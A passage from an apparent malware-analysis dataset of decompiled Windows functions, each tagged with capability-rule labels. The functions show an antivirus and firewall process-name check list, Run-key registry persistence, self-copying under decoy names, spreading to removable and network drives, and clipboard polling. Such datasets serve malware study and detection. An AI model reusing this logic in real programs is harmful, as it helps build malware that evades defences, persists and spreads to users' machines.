(cVar3 != '\\0');\n                pcVar10 = pcVar10 + (pcVar4 - (pcVar5 + 1));\n                iVar8 = fcn.004228ad(iVar8, pcVar10 + 1);\n                if (pcVar4 < pcVar10) {\n                    pcVar7 = pcVar4;\n                    do {\n                        pcVar7[iVar8] = pcVar5[pcVar7 - pcVar4];\n                        pcVar7 = pcVar7 + 1;\n                    } while (pcVar7 < pcVar10);\n                }\n                pcVar10[iVar8] = '\\0';\n                iVar8 = fcn.004228ad(iVar8, pcVar10 + 3);\n                pcVar5 = pcVar10 + 2;\n                if (pcVar10 < pcVar5) {\n                    iVar12 = 0x43daa8 - pcVar10;\n                    do {\n                        pcVar10[iVar8] = pcVar10[iVar12];\n                        pcVar10 = pcVar10 + 1;\n                    } while (pcVar10 < pcVar5);\n                }\n                iVar11 = iVar11 + 1;\n                pcVar5[iVar8] = '\\0';\n                unaff_EDI = pcVar6;\n            } while (iVar11 < *0x443cd0);\n        }\n        fcn.00429890(auStack372, 0, 0x44);\n        uVar9 = 0;\n        uStack380 = 0;\n        uStack376 = 0;\n        (*_sym.imp.KERNEL32.DLL_CreateProcessA)(0, iVar8, 0, 0, 0, 0x100, 0, 0, auStack372, &stack0xfffffe7c);\n        fcn.00420c59(uVar9);\n        fcn.00420c59(pcVar6);\n        fcn.004214f1(iVar8);\n    }\n    fcn.00420bc6(unaff_EDI);\n    return;\n}\n",
        "token_count": 1833
    },
    "00407830": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00407830(void)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    char *pcVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint8_t *puVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint uVar9;\n    uint8_t *puVar10;\n    char *pcVar11;\n    uint8_t *puVar12;\n    uint8_t *puVar13;\n    uint unaff_EDI;\n    int32_t **in_FS_OFFSET;\n    bool bVar14;\n    uint32_t in_stack_fffffabc;\n    uint8_t *puStack1344;\n    int32_t iStack1340;\n    int32_t iStack1336;\n    uint8_t *puStack1332;\n    char *apcStack1312 [52];\n    uint8_t auStack1104 [12];\n    uchar auStack1092 [268];\n    uchar auStack824 [264];\n    uchar auStack560 [264];\n    uchar auStack296 [268];\n    uint32_t uStack28;\n    int32_t *piStack20;\n    uint uStack16;\n    uint uStack12;\n    \n    uStack12 = 0xffffffff;\n    uStack16 = 0x4381bb;\n    piStack20 = *in_FS_OFFSET;\n    uStack28 = *0x441480 ^ &stack0xfffffabc;\n    uVar4 = *0x441480 ^ &stack0xfffffab0;\n    *in_FS_OFFSET = &piStack20;\n    puVar13 = NULL;\n    puStack1344 = NULL;\n    iVar5 = fcn.00422819(1);\n    puStack1332 = NULL;\n    uStack12 = 0;\n    in_stack_fffffabc = in_stack_fffffabc & 0xffffff;\n    iStack1340 = 0;\n    iStack1336 = iVar5;\n    if (0 < *0x443cd0) {\n        do {\n            iVar7 = iStack1340;\n            if (in_stack_fffffabc >> 0x18 == '\\0') {\n                puVar6 = *(*0x443cd4 + iStack1340 * 4);\n                pcVar11 = \"/START\";\n                do {\n                    uVar1 = *puVar6;\n                    bVar14 = uVar1 < *pcVar11;\n                    if (uVar1 != *pcVar11) {\ncode_r0x004078e0:\n                        iVar7 = (1 - bVar14) - (bVar14 != 0);\n                        goto code_r0x004078e5;\n                    }\n                    if (uVar1 == 0) break;\n                    uVar1 = puVar6[1];\n                    bVar14 = uVar1 < pcVar11[1];\n                    if (uVar1 != pcVar11[1]) goto code_r0x004078e0;\n                    puVar6 = puVar6 + 2;\n                    pcVar11 = pcVar11 + 2;\n                } while (uVar1 != 0);\n                iVar7 = 0;\ncode_r0x004078e5:\n                if (iVar7 == 0) {\n                    iStack1340 = iStack1340 + 1;\n                    in_stack_fffffabc = CONCAT13(1, in_stack_fffffabc);\n                    if (iStack1340 < *0x443cd0) {\n                        puVar10 = *(*0x443cd4 + iStack1340 * 4);\n                        puStack1344 = puVar10;\n                        iVar5 = fcn.004228ad(iVar5, puVar13 + 2);\n                        puVar6 = puVar13 + 1;\n                        if (puVar13 < puVar6) {\n                            iVar7 = 0x43c654 - puVar13;\n                            do {\n                                puVar13[iVar5] = puVar13[iVar7];\n                                puVar13 = puVar13 + 1;\n                                puVar10 = puStack1344;\n                            } while (puVar13 < puVar6);\n                        }\n                        puVar6[iVar5] = 0;\n                        puVar12 = puVar10;\n                        do {\n                            uVar1 = *puVar12;\n                            puVar12 = puVar12 + 1;\n                        } while (uVar1 != 0);\n                        puVar12 = puVar12 + (puVar6 - (puVar10 + 1));\n                        iVar5 = fcn.004228ad(iVar5, puVar12 + 1);\n                        if (puVar6 < puVar12) {\n                            puVar13 = puVar6;\n                            do {\n                                puVar13[iVar5] = puVar10[puVar13 - puVar6];\n                                puVar13 = puVar13 + 1;\n                            } while (puVar13 < puVar12);\n                        }\n                        puVar12[iVar5] = 0;\n                        iVar5 = fcn.004228ad(iVar5, puVar12 + 3);\n                        puVar13 = puVar12 + 2;\n                        if (puVar12 < puVar13) {\n                            iVar7 = 0x43daa8 - puVar12;\n                            do {\n                                puVar12[iVar5] = puVar12[iVar7];\n                                puVar12 = puVar12 + 1;\n                            } while (puVar12 < puVar13);\n                        }\n                        goto code_r0x00407a4d;\n                    }\n                }\n            }\n            else {\n                iVar5 = fcn.004228ad(iVar5, puVar13 + 2);\n                puVar6 = puVar13 + 1;\n                if (puVar13 < puVar6) {\n                    iVar8 = 0x43c654 - puVar13;\n                    do {\n                        puVar13[iVar5] = puVar13[iVar8];\n                        puVar13 = puVar13 + 1;\n                        iVar7 = iStack1340;\n                    } while (puVar13 < puVar6);\n                }\n                iVar8 = *0x443cd4;\n                puVar6[iVar5] = 0;\n                pcVar3 = *(iVar8 + iVar7 * 4);\n                pcVar11 = pcVar3;\n                do {\n                    cVar2 = *pcVar11;\n                    pcVar11 = pcVar11 + 1;\n                } while (cVar2 != '\\0');\n                pcVar11 = pcVar11 + (puVar6 - (pcVar3 + 1));\n                iVar5 = fcn.004228ad(iVar5, pcVar11 + 1);\n                if (puVar6 < pcVar11) {\n                    puVar13 = puVar6;\n                    do {\n                        puVar13[iVar5] = pcVar3[puVar13 - puVar6];\n                        puVar13 = puVar13 + 1;\n                    } while (puVar13 < pcVar11);\n                }\n                pcVar11[iVar5] = '\\0';\n                iVar5 = fcn.004228ad(iVar5, pcVar11 + 3);\n                puVar13 = pcVar11 + 2;\n                if (pcVar11 < puVar13) {\n                    iVar7 = 0x43daa8 - pcVar11;\n                    do {\n                        pcVar11[iVar5] = pcVar11[iVar7];\n                        pcVar11 = pcVar11 + 1;\n                    } while (pcVar11 < puVar13);\n                }\ncode_r0x00407a4d:\n                puVar13[iVar5] = 0;\n                puStack1332 = puVar13;\n            }\n            iStack1340 = iStack1340 + 1;\n        } while (iStack1340 < *0x443cd0);\n        iStack1336 = iVar5;\n        if (in_stack_fffffabc >> 0x18 != '\\0') {\n            apcStack1312[0] = \"avast\";\n            apcStack1312[1] = 0x43dbec;\n            apcStack1312[2] = \"eset\";\n            apcStack1312[3] = \"egui\";\n            apcStack1312[4] = 0x43dc00;\n            apcStack1312[5] = \"kasper\";\n            apcStack1312[6] = \"drweb\";\n            apcStack1312[7] = \"clamav\";\n            apcStack1312[8] = \"ekrn\";\n            apcStack1312[9] = 0x43dc24;\n            apcStack1312[10] = \"antivir\";\n            apcStack1312[11] = \"f-prot\";\n            apcStack1312[12] = 0x43dc38;\n            apcStack1312[13] = \"nod32\";\n            apcStack1312[14] = \"avira\";\n            apcStack1312[15] = \"arcavir\";\n            apcStack1312[16] = \"bitdefender\";\n            apcStack1312[17] = \"f-secure\";\n            apcStack1312[18] = \"fsecure\";\n            apcStack1312[19] = \"g-data\";\n            apcStack1312[20] = \"gdata\";\n            apcStack1312[21] = \"ikarus\";\n            apcStack1312[22] = \"panda\";\n            apcStack1312[23] = \"quickheal\";\n            apcStack1312[24] = \"sophos\";\n            apcStack1312[25] = \"vba32\";\n            apcStack1312[26] = \"virusbuster\";\n            apcStack1312[27] = \"symantec\";\n            apcStack1312[28] = \"norton\";\n            apcStack1312[29] = \"cureit\";\n            apcStack1312[30] = \"trendmicro\";\n            apcStack1312[31] = \"mcafee\";\n            apcStack1312[32] = \"msascui\";\n            apcStack1312[33] = \"iobit\";\n            apcStack1312[34] = \"outpost\";\n            apcStack1312[35] = \"agnitum\";\n            apcStack1312[36] = \"comodo\";\n            apcStack1312[37] = \"firewall\";\n            iVar7 = 0;\n            do {\n                puVar13 = puStack1344;\n                iVar8 = fcn.00422b30(puStack1344, apcStack1312[iVar7], uVar4);\n                if (iVar8 != 0) goto code_r0x00407d8d;\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < 0x26);\n            fcn.00423615(puVar13, auStack560, auStack824, 0, 0);\n            fcn.00420bd5(auStack296, 0x43dd20, auStack560);\n            (*_sym.imp.KERNEL32.DLL_SetCurrentDirectoryA)(auStack296);\n            in_stack_fffffabc = fcn.00420d1e(\"TEMP\");\n            uVar9 = fcn.00401000();\n            (*_sym.imp.KERNEL32.DLL_GetModuleFileNameA)(0, auStack1092, 0x104);\n            puVar6 = auStack1104;\n            puVar10 = puVar13;\n            do {\n                uVar1 = *puVar10;\n                bVar14 = uVar1 < *puVar6;\n                if (uVar1 != *puVar6) {\ncode_r0x00407cb0:\n                    iVar7 = (1 - bVar14) - (bVar14 != 0);\n                    goto code_r0x00407cb5;\n                }\n                if (uVar1 == 0) break;\n                uVar1 = puVar10[1];\n                bVar14 = uVar1 < puVar6[1];\n                if (uVar1 != puVar6[1]) goto code_r0x00407cb0;\n                puVar10 = puVar10 + 2;\n                puVar6 = puVar6 + 2;\n            } while (uVar1 != 0);\n            iVar7 = 0;\ncode_r0x00407cb5:\n            if ((iVar7 != 0) && (iVar7 = fcn.00422b30(puVar13, uVar9),  iVar7 == 0)) {\n                if (*0x444a85 == '\\0') {\n                    fcn.004060f0();\n                    *0x444a85 = '\\x01';\n                }\n                iVar7 = fcn.00422b30(puVar13, *(*0x444b3c + 0x9c));\n                if ((iVar7 == 0) && (iVar7 = fcn.00422b30(puVar13, unaff_EDI),  iVar7 == 0)) {\n                    if (*0x444a85 == '\\0') {\n                        fcn.004060f0();\n                        *0x444a85 = '\\x01';\n                    }\n                    fcn.00404dc0(*(*0x444b3c + 0x98), auStack1104, puVar13);\n                }\n            }\n            fcn.00420c59(uVar9);\n            fcn.00429890(apcStack1312 + 0x22, 0, 0x44);\n            puStack1344 = NULL;\n            iStack1340 = 0;\n            iStack1336 = 0;\n            puStack1332 = NULL;\n            (*_sym.imp.KERNEL32.DLL_CreateProcessA)(0, iVar5, 0, 0, 0, 0x100, 0, 0, apcStack1312 + 0x22, &puStack1344);\n        }\n    }\ncode_r0x00407d8d:\n    fcn.004214f1(iVar5);\n    *in_FS_OFFSET = piStack20;\n    fcn.00420bc6(in_stack_fffffabc);\n    return;\n}\n",
        "token_count": 3101
    },
    "00407dc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00407dc0(void)\n\n{\n    uint8_t uVar1;\n    code *pcVar2;\n    char cVar3;\n    uint uVar4;\n    uchar *lpPathName;\n    int32_t iVar5;\n    uint8_t *lpFileName;\n    uint8_t *puVar6;\n    uint8_t *puVar7;\n    bool bVar8;\n    uint arg_8h;\n    int32_t iVar9;\n    uchar *puStack472;\n    uint32_t uVar10;\n    uchar auStack444 [4];\n    uchar *puStack440;\n    uint8_t auStack340 [52];\n    uchar auStack288 [276];\n    uint32_t uStack12;\n    \n    uStack12 = *0x441480 ^ &stack0xfffffe44;\n    uVar4 = fcn.00420e6f(0);\n    fcn.00420c64(uVar4);\n    lpPathName = fcn.00401000();\n    puStack440 = lpPathName;\n    iVar5 = (*_sym.imp.SHLWAPI.dll_PathFileExistsA)();\n    pcVar2 = _sym.imp.KERNEL32.DLL_SetFileAttributesA;\n    if (iVar5 == 0) {\n        fcn.004232df(lpPathName);\n        fcn.00401fe0(lpPathName);\n        puStack472 = 0x407e26;\n        fcn.00408030(lpPathName, 0);\n        puStack472 = 0x407e2e;\n        (*pcVar2)();\n    }\n    (*_sym.imp.KERNEL32.DLL_SetCurrentDirectoryA)();\n    puStack472 = &stack0xfffffee0;\n    (*_sym.imp.KERNEL32.DLL_GetModuleFileNameA)(0);\n    lpFileName = fcn.00401120();\n    iVar5 = (*_sym.imp.SHLWAPI.dll_PathFileExistsA)(lpFileName);\n    if (iVar5 != 0) {\n        fcn.004227e9(lpFileName);\n    }\n    if (*0x444a85 == '\\0') {\n        fcn.004060f0();\n        *0x444a85 = '\\x01';\n    }\n    cVar3 = fcn.00404cb0(*(*0x444b3c + 0x98));\n    if (cVar3 == '\\0') {\n        fcn.00401f50(lpFileName);\n    }\n    else {\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        fcn.00404f80(lpFileName, 1);\n    }\n    fcn.004049c0(lpFileName);\n    fcn.00401fe0(lpFileName);\n    (*pcVar2)(lpFileName, 6);\n    uVar10 = 0x94;\n    (*_sym.imp.KERNEL32.DLL_GetVersionExA)(&stack0xfffffe30);\n    if (uVar10 < 6) {\n        puVar6 = lpFileName;\n        do {\n            uVar1 = *puVar6;\n            puVar6 = puVar6 + 1;\n        } while (uVar1 != 0);\n        iVar5 = puVar6 - (lpFileName + 1);\n        uVar4 = fcn.00401540();\n        iVar9 = 0;\n        lpPathName = &stack0xfffffe28;\n        arg_8h = 0;\n        (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)\n                  (0x80000001, \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\", 0, 0, 0, 0x2001f, 0, lpPathName);\n        if (iVar9 != 0) {\n            (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(iVar9, uVar4, 0, 1, lpFileName, iVar5);\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(iVar5);\n        }\n    }\n    else {\n        arg_8h = 0;\n        (*_sym.imp.KERNEL32.DLL_CreateThread)(0, 0, 0x408310, 0, 0, 0);\n    }\n    puVar6 = &stack0xfffffeac;\n    puVar7 = lpFileName;\n    do {\n        uVar1 = *puVar6;\n        bVar8 = uVar1 < *puVar7;\n        if (uVar1 != *puVar7) {\ncode_r0x00407fb4:\n            iVar5 = (1 - bVar8) - (bVar8 != 0);\n            goto code_r0x00407fb9;\n        }\n        if (uVar1 == 0) break;\n        uVar1 = puVar6[1];\n        bVar8 = uVar1 < puVar7[1];\n        if (uVar1 != puVar7[1]) goto code_r0x00407fb4;\n        puVar6 = puVar6 + 2;\n        puVar7 = puVar7 + 2;\n    } while (uVar1 != 0);\n    iVar5 = 0;\ncode_r0x00407fb9:\n    if ((iVar5 != 0) && (iVar5 = (*_sym.imp.SHLWAPI.dll_PathFileExistsA)(lpFileName),  iVar5 != 0)) {\n        if (*0x444a88 != 0) {\n            (*_sym.imp.KERNEL32.DLL_CloseHandle)(*0x444a88);\n        }\n        (*_sym.imp.SHELL32.dll_ShellExecuteA)(0, \"open\", lpFileName, 0x43c488, 0, 5);\n        fcn.00420c59(lpPathName);\n        fcn.00420c59(lpFileName);\n        fcn.00423277(0);\n    }\n    fcn.00420c59(lpPathName);\n    fcn.00420c59(lpFileName);\n    fcn.00420bc6(arg_8h);\n    return;\n}\n",
        "token_count": 1323
    },
    "00408030": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408030(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    uint *puVar5;\n    uint arg_8h_00;\n    int32_t iVar6;\n    bool bVar7;\n    uint in_stack_fffffea8;\n    uint var_150h;\n    char *var_14ch;\n    char *var_148h;\n    char *var_144h;\n    char *var_140h;\n    char *var_13ch;\n    char *var_138h;\n    char *var_134h;\n    char *var_130h;\n    char *var_12ch;\n    char *var_128h;\n    char *var_124h;\n    char *var_120h;\n    char *var_11ch;\n    char *var_118h;\n    char *var_114h;\n    char *var_110h;\n    int32_t var_10ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x441480 ^ &stack0xfffffffc;\n    var_110h = arg_8h;\n    iVar2 = fcn.00420c76();\n    iVar6 = iVar2 % 10;\n    if (0 < iVar2 % 10) {\n        do {\n            var_10ch = iVar6;\n            var_150h = 0x43dd28;\n            var_14ch = \"msys\";\n            var_148h = \"mdata\";\n            var_144h = \"lust\";\n            var_140h = \"icxml\";\n            var_13ch = \"ntw32\";\n            var_138h = \"aeinv\";\n            var_134h = \"apds\";\n            var_130h = \"nthserv\";\n            var_12ch = \"teln32\";\n            var_128h = \"openssh\";\n            var_124h = \"srv_x86\";\n            var_120h = \"socket_x86\";\n            var_11ch = \"nt32\";\n            var_118h = \"winnt32\";\n            var_114h = \"cygwin32\";\n            uVar3 = fcn.00420c76();\n            pcVar4 = (&var_150h)[uVar3 & 0xf];\n            iVar6 = &var_108h - pcVar4;\n            do {\n                cVar1 = *pcVar4;\n                pcVar4[iVar6] = cVar1;\n                pcVar4 = pcVar4 + 1;\n            } while (cVar1 != '\\0');\n            uVar3 = fcn.00420c76();\n            uVar3 = uVar3 & 0x80000001;\n            bVar7 = uVar3 == 0;\n            if (uVar3 < 0) {\n                bVar7 = (uVar3 - 1 | 0xfffffffe) == 0xffffffff;\n            }\n            puVar5 = &var_108h;\n            if (bVar7) {\n                var_130h = 0x43ddac;\n                var_12ch = 0x43ddb0;\n                var_128h = 0x43ddb4;\n                var_124h = 0x43ddb8;\n                var_120h = 0x43ddbc;\n                var_11ch = 0x43ddc0;\n                var_118h = 0x43ddc4;\n                var_114h = 0x43ddc8;\n                do {\n                    cVar1 = *puVar5;\n                    puVar5 = puVar5 + 1;\n                } while (cVar1 != '\\0');\n                pcVar4 = arg_8h;\n                do {\n                    cVar1 = *pcVar4;\n                    pcVar4 = pcVar4 + 1;\n                } while (cVar1 != '\\0');\n                arg_8h_00 = fcn.0041ff97(pcVar4 + puVar5 + ((0x20 - (&var_108h + 1)) - (arg_8h + 1)));\n                fcn.00420c76();\n                fcn.00420bd5(arg_8h_00, \"%s\\\\%s.%s\", arg_8h);\n                iVar6 = (*_sym.imp.SHLWAPI.dll_PathFileExistsA)(arg_8h_00);\n                if ((iVar6 == 0) && (iVar6 = fcn.00421d73(arg_8h_00, 0x43daa4),  iVar6 != 0)) {\n                    iVar2 = fcn.00420c76();\n                    iVar2 = iVar2 % 10 << 10;\n                    if (0 < iVar2) {\n                        do {\n                            uVar3 = fcn.00420c76();\n                            uVar3 = uVar3 & 0x800000ff;\n                            if (uVar3 < 0) {\n                                uVar3 = (uVar3 - 1 | 0xffffff00) + 1;\n                            }\n                            fcn.00423311(iVar6, 0x43ddd8, uVar3);\n                            iVar2 = iVar2 + -1;\n                            arg_8h = var_110h;\n                        } while (iVar2 != 0);\n                    }\n                    fcn.004226f5(iVar6);\n                    fcn.00401fe0(arg_8h_00);\n                }\n            }\n            else {\n                do {\n                    cVar1 = *puVar5;\n                    puVar5 = puVar5 + 1;\n                } while (cVar1 != '\\0');\n                pcVar4 = arg_8h;\n                do {\n                    cVar1 = *pcVar4;\n                    pcVar4 = pcVar4 + 1;\n                } while (cVar1 != '\\0');\n                arg_8h_00 = fcn.0041ff97(pcVar4 + puVar5 + ((0x20 - (&var_108h + 1)) - (arg_8h + 1)));\n                fcn.00420bd5(arg_8h_00, 0x43c26c, arg_8h);\n                iVar6 = (*_sym.imp.SHLWAPI.dll_PathFileExistsA)(arg_8h_00);\n                if ((iVar6 == 0) && (arg_ch < 1)) {\n                    fcn.004232df(arg_8h_00);\n                    if (arg_ch + 1 < 2) {\n                        fcn.00408030(arg_8h_00, arg_ch + 1);\n                    }\n                }\n            }\n            fcn.00420c59(arg_8h_00);\n            var_10ch = var_10ch + -1;\n            iVar6 = var_10ch;\n        } while (var_10ch != 0);\n    }\n    fcn.00420bc6(in_stack_fffffea8);\n    return;\n}\n",
        "token_count": 1542
    },
    "00408340": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00408340(void)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    uint arg_8h;\n    char *pcVar5;\n    uint arg_8h_00;\n    int32_t iVar6;\n    uchar auStack588 [3];\n    char cStack585;\n    char acStack552 [260];\n    char acStack292 [4];\n    char acStack288 [4];\n    uchar auStack284 [272];\n    uint32_t uStack12;\n    \n    uStack12 = *0x441480 ^ auStack588;\n    cStack585 = 'a';\n    do {\n        fcn.00420bd5(acStack292 + 4, \"%c:\\\\\", cStack585);\n        iVar3 = (*_sym.imp.SHLWAPI.dll_PathFileExistsA)();\n        pcVar2 = _sym.imp.KERNEL32.DLL_GetDriveTypeA;\n        if ((iVar3 != 0) &&\n           ((iVar3 = (*_sym.imp.KERNEL32.DLL_GetDriveTypeA)(acStack292),  iVar3 == 2 ||\n            (iVar3 = (*pcVar2)(acStack292),  iVar3 == 4)))) {\n            pcVar4 = acStack292;\n            do {\n                cVar1 = *pcVar4;\n                pcVar4 = pcVar4 + 1;\n            } while (cVar1 != '\\0');\n            arg_8h = fcn.0041ff97(pcVar4 + (8 - (acStack292 + 1)));\n            (*_sym.imp.KERNEL32.DLL_GetModuleFileNameA)(0, auStack284, 0x104);\n            fcn.00420bd5(arg_8h, \"%s*.exe\", acStack292);\n            iVar3 = fcn.00422c32(arg_8h, auStack588);\n            if ((iVar3 != 0) && (iVar3 != -1)) {\n                do {\n                    pcVar4 = acStack292;\n                    do {\n                        pcVar5 = pcVar4;\n                        pcVar4 = pcVar5 + 1;\n                    } while (*pcVar5 != '\\0');\n                    pcVar4 = acStack552;\n                    do {\n                        cVar1 = *pcVar4;\n                        pcVar4 = pcVar4 + 1;\n                    } while (cVar1 != '\\0');\n                    arg_8h_00 = fcn.0041ff97(pcVar4 + &stack0xfffffda4 * -2 + pcVar5 + -0x165);\n                    fcn.00420bd5(arg_8h_00, 0x43dd20, acStack292);\n                    iVar6 = (*_sym.imp.SHLWAPI.dll_PathFileExistsA)(arg_8h_00);\n                    if (iVar6 != 0) {\n                        if (*0x444a85 == '\\0') {\n                            fcn.004060f0();\n                            *0x444a85 = '\\x01';\n                        }\n                        iVar6 = fcn.00422b30(arg_8h_00, *(*0x444b3c + 0x9c));\n                        if (iVar6 == 0) {\n                            if (*0x444a85 == '\\0') {\n                                fcn.004060f0();\n                                *0x444a85 = '\\x01';\n                            }\n                            fcn.00404dc0(*(*0x444b3c + 0x98), auStack284, arg_8h_00);\n                            fcn.00420c59(arg_8h_00);\n                        }\n                    }\n                    iVar6 = fcn.00422d59(iVar3, auStack588);\n                } while (iVar6 == 0);\n                fcn.00422e87(iVar3);\n            }\n            fcn.00420c59(arg_8h);\n        }\n        (*_sym.imp.KERNEL32.DLL_Sleep)(100);\n        if ('y' < cStack585) {\n            cStack585 = 'a';\n        }\n        cStack585 = cStack585 + '\\x01';\n    } while( true );\n}\n",
        "token_count": 901
    },
    "00408550": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00408550(void)\n\n{\n    char *pcVar1;\n    char cVar2;\n    char *arg_10h;\n    char *pcVar3;\n    char *pcVar4;\n    uint arg_8h;\n    uint32_t uVar5;\n    \n    arg_10h = fcn.00420d1e(\"APPDATA\");\n    pcVar3 = arg_10h;\n    do {\n        cVar2 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar2 != '\\0');\n    if (*0x444a85 == '\\0') {\n        fcn.004060f0();\n        *0x444a85 = '\\x01';\n    }\n    pcVar4 = *(*0x444b3c + 0x90);\n    pcVar1 = pcVar4 + 1;\n    do {\n        cVar2 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar2 != '\\0');\n    arg_8h = fcn.0041ff97(pcVar3 + pcVar4 + ((0x10 - pcVar1) - (arg_10h + 1)));\n    if (*0x444a85 == '\\0') {\n        fcn.004060f0();\n        *0x444a85 = '\\x01';\n    }\n    fcn.00420bd5(arg_8h, 0x43c26c, arg_10h);\n    uVar5 = (*_sym.imp.SHLWAPI.dll_PathFileExistsA)(arg_8h);\n    return uVar5 & 0xffffff00 | uVar5 != 0;\n}\n",
        "token_count": 375
    },
    "00408780": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00408780(void)\n\n{\n    char cVar1;\n    uint arg_8h;\n    code *pcVar2;\n    bool bVar3;\n    code *pcVar4;\n    code *pcVar5;\n    char *pcVar6;\n    float10 fVar7;\n    double dVar8;\n    uchar auStack116 [4];\n    uchar auStack112 [4];\n    uchar auStack108 [16];\n    uchar auStack92 [24];\n    uint32_t uStack68;\n    \n    pcVar4 = _sym.imp.KERNEL32.DLL_WriteFile;\n    pcVar2 = _sym.imp.KERNEL32.DLL_CreateFileA;\n    uStack68 = *0x441480 ^ auStack116;\n    bVar3 = false;\n    while( true ) {\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        *0x444a88 = (*_sym.imp.KERNEL32.DLL_CreateMailslotA)((*0x444b3c)[1], 0);\n        pcVar5 = _sym.imp.KERNEL32.DLL_ReadFile;\n        if (*0x444a88 != -1) break;\n        if (bVar3) goto code_r0x0040891d;\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        *0x444a88 = (*pcVar2)((*0x444b3c)[1], 0x40000000, 1, 0, 3, 0x80, 0);\n        if (*0x444a88 != 0) {\n            if (*0x444a85 == '\\0') {\n                fcn.004060f0();\n                *0x444a85 = '\\x01';\n            }\n            fVar7 = fcn.00422fdf(**0x444b3c);\n            fcn.00420bd5(&stack0xffffff88, 0x43d960, SUB84(fVar7, 0));\n            pcVar6 = &stack0xffffff88;\n            do {\n                cVar1 = *pcVar6;\n                pcVar6 = pcVar6 + 1;\n            } while (cVar1 != '\\0');\n            (*pcVar4)(*0x444a88, &stack0xffffff88, pcVar6 - &stack0xffffff89);\n            bVar3 = true;\n        }\n        (*_sym.imp.KERNEL32.DLL_Sleep)();\n    }\n    *0x444a87 = 1;\n    while( true ) {\n        (*pcVar5)(*0x444a88, auStack92, 8, auStack108, 0);\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        arg_8h = **0x444b3c;\n        fVar7 = fcn.00422fdf(auStack112);\n        dVar8 = fVar7;\n        fVar7 = fcn.00422fdf(arg_8h);\n        if (fVar7 < dVar8) break;\n        (*_sym.imp.KERNEL32.DLL_Sleep)(0x32);\n    }\n    (*_sym.imp.KERNEL32.DLL_CloseHandle)(*0x444a88);\n    if (*0x444a80 != 0) {\n        fcn.00420c59(*0x444a80);\n    }\ncode_r0x0040891d:\n    fcn.00423277(0);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 825
    },
    "00408ac0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00408ac0(void)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint uVar3;\n    int32_t iVar4;\n    char *arg_8h;\n    char *pcVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    uint uVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    uint auStack16 [3];\n    \n    uVar3 = fcn.00420e6f(0);\n    fcn.00420c64(uVar3);\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_OpenClipboard)(0);\n        if (iVar4 != 0) {\n            uVar3 = (*_sym.imp.USER32.dll_GetClipboardData)(1);\n            arg_8h = (*_sym.imp.KERNEL32.DLL_GlobalLock)(uVar3);\n            (*_sym.imp.KERNEL32.DLL_GlobalUnlock)(uVar3);\n            (*_sym.imp.USER32.dll_CloseClipboard)();\n            if (arg_8h != NULL) {\n                pcVar5 = arg_8h;\n                do {\n                    cVar2 = *pcVar5;\n                    pcVar5 = pcVar5 + 1;\n                } while (cVar2 != '\\0');\n                iVar4 = pcVar5 - (arg_8h + 1);\n                if (*0x444a85 == '\\0') {\n                    fcn.004060f0();\n                    *0x444a85 = '\\x01';\n                }\n                